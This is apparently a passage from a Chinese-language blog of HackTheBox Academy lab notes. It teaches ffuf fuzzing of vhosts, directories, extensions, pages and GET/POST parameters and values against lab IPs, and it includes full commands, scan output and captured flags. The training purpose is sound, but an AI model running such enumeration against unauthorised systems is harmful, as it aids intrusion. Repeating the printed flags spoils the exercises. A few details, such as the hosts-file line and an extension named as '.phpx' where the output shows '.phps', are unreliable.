title="prectice"></a>prectice</h5><pre><code>target:165.232.46.252:32335试着在“academy.htb”上运行VHost模糊扫描，看看你还能得到什么其他VHost。你还得到了哪些VHosts？hint:请确保过滤正确！把答案写成“*.academy.htb”。</code></pre><p>kali:</p><p>先把域名映射放到hosts文件：</p><pre><code>echo http://165.232.46.252 academy.htb &gt;&gt; /etc/hosts</code></pre><p>扫描：发现结果很多，过滤一下，这里我们发现绝大多数的响应大小是986，过滤掉</p><pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:32335 -H &#39;Host: FUZZ.academy.htb&#39; -fs 986        /&#39;___\  /&#39;___\           /&#39;___\              /\ \__/ /\ \__/  __  __  /\ \__/              \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\              \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/               \ \_\   \ \_\  \ \____/  \ \_\                 \/_/    \/_/   \/___/    \/_/              v1.3.1 Kali Exclusive &lt;3________________________________________________ :: Method           : GET :: URL              : http://academy.htb:32335 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Header           : Host: FUZZ.academy.htb :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200,204,301,302,307,401,403,405 :: Filter           : Response size: 986________________________________________________admin                   [Status: 200, Size: 0, Words: 1, Lines: 1]test                    [Status: 200, Size: 0, Words: 1, Lines: 1]:: Progress: [4989/4989] :: Job [1/1] :: 125 req/sec :: Duration: [0:00:44] :: Errors: 0 ::</code></pre><p>此时只有两个结果，分别try一try，发现都是<code>Secure Connection Failed</code></p><p>很烦，只能都提交试试了，答案是test，很烦。。。</p><h3 id="参数模糊（Parameter-Fuzzing）"><a href="#参数模糊（Parameter-Fuzzing）" class="headerlink" title="参数模糊（Parameter Fuzzing）"></a>参数模糊（Parameter Fuzzing）</h3><h4 id="GET请求模糊"><a href="#GET请求模糊" class="headerlink" title="GET请求模糊"></a>GET请求模糊</h4><p>类似于我们如何模糊网站的各个部分，我们将使用ffuf来枚举参数。让我们首先从GET请求的模糊处理开始，这些请求通常在URL之后传递，并带有？符号，例如：<br><a href="http://admin.academy.htb:PORT/admin/admin.php?param1=key">http://admin.academy.htb:PORT/admin/admin.php?param1=key</a>.<br>所以，我们所要做的就是用FUZZ替换上面例子中的param1，然后重新运行我们的扫描。然而，在我们开始之前，我们必须选择一个合适的单词表。再一次，SecLists在&#x2F;opt&#x2F;helper&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;burp-parameter-names.txt中有这个。有了它，我们可以运行扫描。</p><h5 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h5><pre><code>target:139.59.185.174:32533使用您在本节中学到的知识，在此页面上运行参数模糊扫描。这个网页接受的参数是多少？</code></pre><p>kali:</p><pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:32533/admin/admin.php?FUZZ=key -fs 798        /&#39;___\  /&#39;___\           /&#39;___\              /\ \__/ /\ \__/  __  __  /\ \__/              \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\              \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/               \ \_\   \ \_\  \ \____/  \ \_\                 \/_/    \/_/   \/___/    \/_/              v1.3.1 Kali Exclusive &lt;3________________________________________________ :: Method           : GET :: URL              : http://admin.academy.htb:32533/admin/admin.php?FUZZ=key :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200,204,301,302,307,401,403,405 :: Filter           : Response size: 798________________________________________________user                    [Status: 200, Size: 783, Words: 221, Lines: 54]:: Progress: [6453/6453] :: Job [1/1] :: 127 req/sec :: Duration: [0:00:56] :: Errors: 0 ::</code></pre><p>user。</p><h4 id="POST请求模糊"><a href="#POST请求模糊" class="headerlink" title="POST请求模糊"></a>POST请求模糊</h4><p>​要用ffuf模糊数据字段，我们可以使用-d标志，正如我们之前在ffuf-h的输出中看到的那样。我们还必须添加-X POST来发送POST请求。</p><p>提示：在PHP中，“POST”数据“内容类型”只能接受“application&#x2F;x-www-form-urlencoded”。因此，我们可以在“ffuf”中用“-H’内容类型：application&#x2F;x-www-form-urlencoded”来设置它。</p><pre><code> ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d &#39;FUZZ=key&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -fs xxx        /&#39;___\  /&#39;___\           /&#39;___\              /\ \__/ /\ \__/  __  __  /\ \__/              \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\              \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/               \ \_\   \ \_\  \ \____/  \ \_\                 \/_/    \/_/   \/___/    \/_/              v1.1.0-git________________________________________________ :: Method           : POST :: URL              : http://admin.academy.htb:PORT/admin/admin.php :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt :: Header           : Content-Type: application/x-www-form-urlencoded :: Data             : FUZZ=key :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200,204,301,302,307,401,403 :: Filter           : Response size: xxx________________________________________________id                      [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]&lt;...SNIP...&gt;</code></pre><p>让我们看看如果我们发送带有id参数的POST请求会得到什么。</p><pre><code>curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d &#39;id=key&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39;&lt;div class=&#39;center&#39;&gt;&lt;p&gt;Invalid id!&lt;/p&gt;&lt;/div&gt;</code></pre><h3 id="值模糊（Value-Fuzzing）"><a href="#值模糊（Value-Fuzzing）" class="headerlink" title="值模糊（Value Fuzzing）"></a>值模糊（Value Fuzzing）</h3><p>这里需要自己判断和创建爆破列表(例：ids.txt)</p><p>usage：</p><pre><code>ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d &#39;id=FUZZ&#39; -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -fs xxx</code></pre><h4 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h4><pre><code>target：139.59.185.174:32533尝试创建“ids.txt”单词列表，用模糊扫描识别接受的值，然后在带有“curl”的“POST”请求中使用它来收集标志。旗帜的内容是什么？</code></pre><p>kali:</p><pre><code>ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:32533/admin/admin.php -X POST -d &#39;id=FUZZ&#39; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -fs 768        /&#39;___\  /&#39;___\           /&#39;___\              /\ \__/ /\ \__/  __  __  /\ \__/              \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\              \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/               \ \_\   \ \_\  \ \____/  \ \_\                 \/_/    \/_/   \/___/    \/_/              v1.3.1 Kali Exclusive &lt;3________________________________________________ :: Method           : POST :: URL              : http://admin.academy.htb:32533/admin/admin.php :: Wordlist         : FUZZ: ids.txt :: Header           : Content-Type: application/x-www-form-urlencoded :: Data             : id=FUZZ :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200,204,301,302,307,401,403,405 :: Filter           : Response size: 768________________________________________________73                      [Status: 200, Size: 787, Words: 218, Lines: 54]:: Progress: [1000/1000] :: Job [1/1] :: 124 req/sec :: Duration: [0:00:10] :: Errors: 0 ::</code></pre><p>得到73，try一下：</p><pre><code>curl http://admin.academy.htb:32533/admin/admin.php -X POST -d &#39;id=73&#39; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -i  HTTP/1.1 200 OKDate: Wed, 14 Jun 2023 11:00:25 GMTServer: Apache/2.4.41 (Ubuntu)Vary: Accept-EncodingContent-Length: 787Content-Type: text/html; charset=UTF-8&lt;div class=&#39;center&#39;&gt;&lt;p&gt;HTB&#123;p4r4m373r_fuzz1n6_15_k3y!&#125;&lt;/p&gt;&lt;/div&gt;</code></pre><p>ok。</p><h3 id="Skills-Assessment-Web-Fuzzing"><a href="#Skills-Assessment-Web-Fuzzing" class="headerlink" title="Skills Assessment - Web Fuzzing"></a>Skills Assessment - Web Fuzzing</h3><pre><code>target:165.232.33.45:32589</code></pre><ul><li>在“*.academy.htb”上运行子域&#x2F;虚拟主域模糊测试扫描，以查找上面显示的 IP。您可以识别哪些子域？（只写子域名）</li><li>在运行页面模糊测试扫描之前，应首先运行扩展模糊测试扫描。域接受哪些不同的扩展名？</li><li>您将识别的页面之一应显示“您无权访问！什么是整页网址？</li><li>在上一个问题的页面中，您应该能够找到页面接受的多个参数。它们是什么？</li><li>尝试模糊您为工作值确定的参数。其中一个应该归还一面旗帜。旗帜的内容是什么？</li></ul><p>kali：</p><pre><code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://165.232.33.45:32589/ -H &#39;Host: FUZZ.academy.htb&#39; -fs 985        /&#39;___\  /&#39;___\           /&#39;___\              /\ \__/ /\ \__/  __  __  /\ \__/              \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\              \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/               \ \_\   \ \_\  \ \____/  \ \_\                 \/_/    \/_/   \/___/    \/_/              v1.3.1 Kali Exclusive &lt;3________________________________________________ :: Method           : GET :: URL              : http://165.232.33.45:32589/ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Header           : Host: FUZZ.academy.htb :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200,204,301,302,307,401,403,405 :: Filter           : Response size: 985________________________________________________archive                 [Status: 200, Size: 0, Words: 1, Lines: 1]test                    [Status: 200, Size: 0, Words: 1, Lines: 1]faculty                 [Status: 200, Size: 0, Words: 1, Lines: 1]:: Progress: [4989/4989] :: Job [1/1] :: 128 req/sec :: Duration: [0:00:44] :: Errors: 0 ::</code></pre><p>ok,看看第二个问题，要对三个子域一块扫描，最终在faculty中多扫出了一个php7：</p><pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://faculty.academy.htb:32589/indexFUZZ        /&#39;___\  /&#39;___\           /&#39;___\              /\ \__/ /\ \__/  __  __  /\ \__/              \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\              \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/               \ \_\   \ \_\  \ \____/  \ \_\                 \/_/    \/_/   \/___/    \/_/              v1.3.1 Kali Exclusive &lt;3________________________________________________ :: Method           : GET :: URL              : http://faculty.academy.htb:32589/indexFUZZ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/web-extensions.txt :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200,204,301,302,307,401,403,405________________________________________________.php                    [Status: 200, Size: 0, Words: 1, Lines: 1].phps                   [Status: 403, Size: 287, Words: 20, Lines: 10].php7                   [Status: 200, Size: 0, Words: 1, Lines: 1]:: Progress: [40/40] :: Job [1/1] :: 35 req/sec :: Duration: [0:00:04] :: Errors: 0 ::</code></pre><p>提交三个答案，看第三题，直觉上还是这个faculty和php7有很大嫌疑，因为之前的扫描里只有它的结果比较不一样。来回扫了几个子域，扫的头疼还是没找到，可能是中止得太早了，调用递归让他自己扫，看看比赛~</p><p>果然，就是在这个faculty和php7上扫出来了，一共17w个记录扫到了第二轮大概5w多才扫到，也就是22w多条，大概二十分钟不到的样子。乌鱼子，搞个靶场没必要这么折磨呜……只不过查看记录在扫出course目录的时候有提醒扫描这个目录，只不过我在看比赛，提前改目标的话应该能快不少。</p><pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:32589/FUZZ -e .php7 -recursion -recursion-depth 1 -v -fs 287 -t 80...[Status: 200, Size: 774, Words: 223, Lines: 53]| URL | http://faculty.academy.htb:32589/courses/linux-security.php7    * FUZZ: linux-security.php7...</code></pre><p>第四题：</p><pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:32589/courses/linux-security.php7?FUZZ=key -fs 774 -t 80        /&#39;___\  /&#39;___\           /&#39;___\              /\ \__/ /\ \__/  __  __  /\ \__/              \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\              \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/               \ \_\   \ \_\  \ \____/  \ \_\                 \/_/    \/_/   \/___/    \/_/              v1.3.1 Kali Exclusive &lt;3________________________________________________ :: Method           : GET :: URL              : http://faculty.academy.htb:32589/courses/linux-security.php7?FUZZ=key :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 80 :: Matcher          : Response status: 200,204,301,302,307,401,403,405 :: Filter           : Response size: 774________________________________________________user                    [Status: 200, Size: 780, Words: 223, Lines: 53]:: Progress: [6453/6453] :: Job [1/1] :: 229 req/sec :: Duration: [0:00:29] :: Errors: 0 ::</code></pre><p>在get方法中的到 <code>user</code> ，看看post，第一遍没扫描出来，php要添加标头<code>&#39;Content-Type: application/x-www-form-urlencoded&#39;</code></p><pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:32589/courses/linux-security.php7 -X POST -d &quot;FUZZ=key&quot; -fs 774 -t 80 -H &#39;Content-Type: application/x-www-form-urlencoded&#39;        /&#39;___\  /&#39;___\           /&#39;___\              /\ \__/ /\ \__/  __  __  /\ \__/              \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\              \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/               \ \_\   \ \_\  \ \____/  \ \_\                 \/_/    \/_/   \/___/    \/_/              v1.3.1 Kali Exclusive &lt;3________________________________________________ :: Method           : POST :: URL              : http://faculty.academy.htb:32589/courses/linux-security.php7 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt :: Header           : Content-Type: application/x-www-form-urlencoded :: Data             : FUZZ=key :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 80 :: Matcher          : Response status: 200,204,301,302,307,401,403,405 :: Filter           : Response size: 774________________________________________________user                    [Status: 200, Size: 780, Words: 223, Lines: 53]username                [Status: 200, Size: 781, Words: 223, Lines: 53]:: Progress: [6453/6453] :: Job [1/1] :: 237 req/sec :: Duration: [0:00:35] :: Errors: 0 ::</code></pre><p>多出了一个<code>username</code>，根据做题经验，下一题的答案应该也就是从这个后面多出来的<code>username</code>入手，正好<code>seclists</code>里有一个<code>Usernames</code>文件,try一下：</p><p>扫到一个harry，post发送一下得到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> base </tag>
            
            <tag> tool </tag>
            
            <tag> hackthebox </tag>
            
            <tag> ffuf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ffuf:Basic Fuzzing</title>
      <link href="/2023/06/13/ffuf/"/>
      <url>/2023/06/13/ffuf/</url>
      
        <content type="html"><![CDATA[<h4 id="模糊-Fuzzing"><a href="#模糊-Fuzzing" class="headerlink" title="模糊(Fuzzing)"></a>模糊(Fuzzing)</h4><p>​术语模糊化是指一种测试技术，它将各种类型的用户输入发送到某个接口，以研究其反应。如果我们对SQL注入漏洞进行模糊处理，我们将发送随机的特殊字符，并查看服务器的反应。如果我们对缓冲区溢出进行模糊处理，我们将发送长字符串并增加它们的长度，以查看二进制文件是否以及何时会中断。<br>​我们通常会为每种类型的网络模糊测试使用预定义的常用术语词汇表，看看网络服务器是否会接受它们。这样做是因为web服务器通常不会提供所有可用链接和域的目录（除非进行了严格的配置），因此我们必须检查各种链接，并查看哪些链接返回页面。</p><p>一些最常用的单词列表可以在GitHub  <a href="https://github.com/danielmiessler/SecLists">SecLists</a> 存储库中找到，该存储库将单词列表分类为各种类型的模糊，甚至包括常用的密码，这些密码稍后将用于密码强制。</p><span id="more"></span><hr><h2 id="Ffuf"><a href="#Ffuf" class="headerlink" title="Ffuf"></a>Ffuf</h2><h3 id="usage"><a href="#usage" class="headerlink" title="usage"></a>usage</h3><pre><code>ffuf -hHTTP OPTIONS:  -H               Header `&quot;Name: Value&quot;`, separated by colon. Multiple -H flags are accepted.  -X               HTTP method to use (default: GET)  -b               Cookie data `&quot;NAME1=VALUE1; NAME2=VALUE2&quot;` for copy as curl functionality.  -d               POST data  -recursion       Scan recursively. Only FUZZ keyword is supported, and URL (-u) has to end in it. (default: false)  -recursion-depth Maximum recursion depth. (default: 0)  -u               Target URL...SNIP...MATCHER OPTIONS:  -mc              Match HTTP status codes, or &quot;all&quot; for everything. (default: 200,204,301,302,307,401,403)  -ms              Match HTTP response size...SNIP...FILTER OPTIONS:  -fc              Filter HTTP status codes from response. Comma separated list of codes and ranges  -fs              Filter HTTP response size. Comma separated list of sizes and ranges...SNIP...INPUT OPTIONS:...SNIP...  -w               Wordlist file path and (optional) keyword separated by colon. eg. &#39;/path/to/wordlist:KEYWORD&#39;OUTPUT OPTIONS:  -o               Write output to file...SNIP...EXAMPLE USAGE:  Fuzz file paths from wordlist.txt, match all responses but filter out those with content-size 42.  Colored, verbose output.    ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v...SNIP...</code></pre><hr><h3 id="目录模糊化（Directory-Fuzzing）"><a href="#目录模糊化（Directory-Fuzzing）" class="headerlink" title="目录模糊化（Directory Fuzzing）"></a>目录模糊化（Directory Fuzzing）</h3><p>​正如我们从上面的例子中看到的，主要的两个选项是-w表示单词列表，-u表示URL。我们可以将一个关键字分配给一个单词列表，以便在我们想要模糊的地方引用它。例如，我们可以选择我们的单词列表，并通过在其后面添加<code>：FUZZ</code>来为其分配关键字FUZZ：</p><pre><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ</code></pre><p>接下来，由于我们想对web目录进行模糊处理，我们可以将FUZZ关键字放置在URL中目录所在的位置，其中：</p><pre><code> ffuf -w &lt;SNIP&gt; -u http://SERVER_IP:PORT/FUZZ</code></pre><p>现在，让我们从下面的问题中开始我们的目标，并对其运行我们的最终命令：</p><pre><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ</code></pre><p>如果我们很着急，我们甚至可以通过将线程数量增加到200来加快速度，例如使用<code>-t 200</code>，但不建议这样做，尤其是在远程网站上使用时，因为这可能会中断它，导致拒绝服务，或者在严重情况下导致您的互联网连接中断。</p><p><a href="http://">^tips</a>: 我们得到一个空页面，表明目录没有专用页面，但也表明我们没有访问它的权限，因为我们没有得到HTTP代码404 not Found或403 access Denied。在下一节中，我们将在该目录下查找页面，看看它是否真的是空的，或者是否有隐藏的文件和页面。</p><h4 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h4><pre><code>target:ip：143.110.174.175:32434除了我们在上面找到的目录之外，还可以找到另一个目录。它是什么？</code></pre><p>kali: </p><pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://143.110.174.175:32434/FUZZ</code></pre><hr><h3 id="页面模糊（Page-Fuzzing）"><a href="#页面模糊（Page-Fuzzing）" class="headerlink" title="页面模糊（Page Fuzzing）"></a>页面模糊（Page Fuzzing）</h3><p>我们现在通过使用单词表和关键字来了解ffuf的基本用法。接下来，我们将学习如何定位页面。</p><h4 id="扩展名模糊（Extension-Fuzzing）"><a href="#扩展名模糊（Extension-Fuzzing）" class="headerlink" title="扩展名模糊（Extension Fuzzing）"></a>扩展名模糊（Extension Fuzzing）</h4><p>在上一节中，我们发现我们可以访问&#x2F;blog，但目录返回了一个空页面，我们无法手动定位任何链接或页面。因此，我们将再次利用web模糊来查看目录是否包含任何隐藏页面。然而，在我们开始之前，我们必须了解网站使用的页面类型，如.html、.aspx、.php或其他类型。<br>一种常见的识别方法是通过HTTP响应头查找服务器类型并猜测扩展名。例如，如果服务器是apache，那么它可能是.php，或者如果是IIS，那么它可以是.asp或.aspx，等等。不过，这种方法不是很实用。因此，我们将再次使用ffuf来模糊扩展，类似于我们对目录的模糊处理。我们不把FUZZ关键字放在目录名所在的位置，而是把它放在扩展名所在的地方<code>.FUZZ</code>，并为常见的扩展名使用单词列表。我们可以使用SecLists中的以下单词列表进行扩展：</p><pre><code> ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ &lt;SNIP&gt;</code></pre><p>在我们开始模糊化之前，我们必须指定扩展名将位于哪个文件的末尾！我们总是可以使用两个单词列表，每个单词列表都有一个唯一的关键字，然后对这两个单词都进行FUZZ_1.FUZZ_2模糊处理。然而，在大多数网站上，我们总能找到一个文件，那就是index.*，所以我们会用它作为我们的文件，并对其进行模糊扩展。</p><pre><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ</code></pre><h3 id="页面模糊-Page-Fuzzing"><a href="#页面模糊-Page-Fuzzing" class="headerlink" title="页面模糊(Page Fuzzing)"></a>页面模糊(Page Fuzzing)</h3><p>现在，我们将使用与ffuf相同的关键字概念，使用.php作为扩展名，将FUZZ关键字放在文件名所在的位置，并使用与模糊目录相同的单词列表：</p><pre><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php</code></pre><h4 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h4><pre><code>target:143.110.174.175:32434试着用你在这一节学到的东西来模糊&#39;/blog&#39;目录并找到所有页面。其中一个应该包含flag。flag是什么？</code></pre><p>kali:</p><pre><code>                    ┌──(root💀kali)-[/usr/share/seclists]└─# ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://143.110.174.175:32434/blog/indexFUZZ -ic        /&#39;___\  /&#39;___\           /&#39;___\              /\ \__/ /\ \__/  __  __  /\ \__/              \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\              \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/               \ \_\   \ \_\  \ \____/  \ \_\                 \/_/    \/_/   \/___/    \/_/              v1.3.1 Kali Exclusive &lt;3________________________________________________ :: Method           : GET :: URL              : http://143.110.174.175:32434/blog/indexFUZZ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/web-extensions.txt :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200,204,301,302,307,401,403,405________________________________________________:: Progress: [40/40] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 .php                    [Status: 200, Size: 0, Words: 1, Lines: 1]:: Progress: [40/40] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 .phps                   [Status: 403, Size: 283, Words: 20, Lines: 10]:: Progress: [40/40] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 :: Progress: [40/40] :: Job [1/1] :: 21 req/sec :: Duration: [0:00:04] :: Errors: 0 ::</code></pre><p>​         </p><p>发现.php 和 .phpx后缀可用</p><p>先查看php后缀：</p><pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://143.110.174.175:32434/blog/FUZZ.php -ic        /&#39;___\  /&#39;___\           /&#39;___\              /\ \__/ /\ \__/  __  __  /\ \__/              \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\              \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/               \ \_\   \ \_\  \ \____/  \ \_\                 \/_/    \/_/   \/___/    \/_/              v1.3.1 Kali Exclusive &lt;3________________________________________________ :: Method           : GET :: URL              : http://143.110.174.175:32434/blog/FUZZ.php :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200,204,301,302,307,401,403,405________________________________________________:: Progress: [40/87651] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors::: Progress: [40/87651] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors::: Progress: [40/87651] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors::: Progress: [40/87651] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors::: Progress: [40/87651] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:                        [Status: 403, Size: 283, Words: 20, Lines: 10]:: Progress: [52/87651] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:home                    [Status: 200, Size: 1046, Words: 438, Lines: 58]</code></pre><p>发现一个home.php</p><p>访问<a href="http://143.110.174.175:32434/blog/home.php%E5%BE%97%E5%88%B0flag%E3%80%82">http://143.110.174.175:32434/blog/home.php得到flag。</a></p><hr><h3 id="递归模糊-Recursive-Fuzzing"><a href="#递归模糊-Recursive-Fuzzing" class="headerlink" title="递归模糊(Recursive Fuzzing)"></a>递归模糊(Recursive Fuzzing)</h3><p>​到目前为止，我们一直在对目录进行模糊处理，然后进入这些目录，然后对文件进行模糊处理。然而，如果我们有几十个目录，每个目录都有自己的子目录和文件，这将需要很长时间才能完成。为了能够自动化这一点，我们将使用所谓的递归模糊。</p><h4 id="递归标志"><a href="#递归标志" class="headerlink" title="递归标志"></a>递归标志</h4><p>当我们递归扫描时，它会自动在页面上任何新识别的目录下开始另一次扫描，直到它模糊了主网站及其所有子目录。<br>一些网站可能有一棵大树的子目录，比如&#x2F;login&#x2F;user&#x2F;content&#x2F;uploads&#x2F;。。。等等，并且这将扩展扫描树并且可能需要很长时间来扫描它们。这就是为什么我们总是建议为递归扫描指定一个深度，这样它就不会扫描比该深度更深的目录。一旦我们模糊了第一个目录，我们就可以选择最感兴趣的目录，并运行另一个扫描来更好地指导我们的扫描。<br>在ffuf中，我们可以使用-recursion标志启用递归扫描，并且可以使用-递归深度标志指定深度。如果我们指定-recursion depth 1，它将只模糊主目录及其直接子目录。如果标识了任何子目录（如&#x2F;login&#x2F;user，则不会对页面进行模糊处理）。当在ffuf中使用递归时，我们可以用-e.php指定我们的扩展</p><p>最后，我们还将添加标志-v来输出完整的URL。否则，可能很难判断哪个.php文件位于哪个目录下。</p><h4 id="递归扫描"><a href="#递归扫描" class="headerlink" title="递归扫描"></a>递归扫描</h4><p>让我们重复我们使用的第一个命令，在指定.php作为扩展名的同时向其添加递归标志</p><pre><code>ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v</code></pre><h4 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h4><p>Target: 143.110.174.175:32434</p><p>Q：试着重复你到目前为止学到的内容，以找到更多的文件&#x2F;目录。其中一个应该给你flag。flag的内容是什么？</p><p>kali：</p><pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://165.232.46.252:32335/FUZZ -recursion -recursion-depth 1 -e .php -v -t 60        /&#39;___\  /&#39;___\           /&#39;___\              /\ \__/ /\ \__/  __  __  /\ \__/              \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\              \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/               \ \_\   \ \_\  \ \____/  \ \_\                 \/_/    \/_/   \/___/    \/_/              v1.3.1 Kali Exclusive &lt;3________________________________________________ :: Method           : GET :: URL              : http://165.232.46.252:32335/FUZZ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt :: Extensions       : .php  :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 60 :: Matcher          : Response status: 200,204,301,302,307,401,403,405________________________________________________[Status: 200, Size: 986, Words: 423, Lines: 56]| URL | http://165.232.46.252:32335/# directory-list-2.3-small.txt    * FUZZ: # directory-list-2.3-small.txt[Status: 200, Size: 986, Words: 423, Lines: 56]| URL | http://165.232.46.252:32335/# on at least 3 different hosts.php    * FUZZ: # on at least 3 different hosts.php[Status: 200, Size: 986, Words: 423, Lines: 56]| URL | http://165.232.46.252:32335/# Attribution-Share Alike 3.0 License. To view a copy of this.php    * FUZZ: # Attribution-Share Alike 3.0 License. To view a copy of this.php[Status: 301, Size: 324, Words: 20, Lines: 10]| URL | http://165.232.46.252:32335/blog| --&gt; | http://165.232.46.252:32335/blog/    * FUZZ: blog[INFO] Adding a new job to the queue: http://165.232.46.252:32335/blog/FUZZ[Status: 403, Size: 282, Words: 20, Lines: 10]| URL | http://165.232.46.252:32335/.php    * FUZZ: .php[Status: 301, Size: 325, Words: 20, Lines: 10]| URL | http://165.232.46.252:32335/forum| --&gt; | http://165.232.46.252:32335/forum/    * FUZZ: forum</code></pre><p>扫出了很多目录，这里不多赘述和展现，直接结果上走——扫描这个forum目录：</p><pre><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://165.232.46.252:32335/forum/FUZZ -recursion -recursion-depth 1 -e .php -v -t 60        /&#39;___\  /&#39;___\           /&#39;___\              /\ \__/ /\ 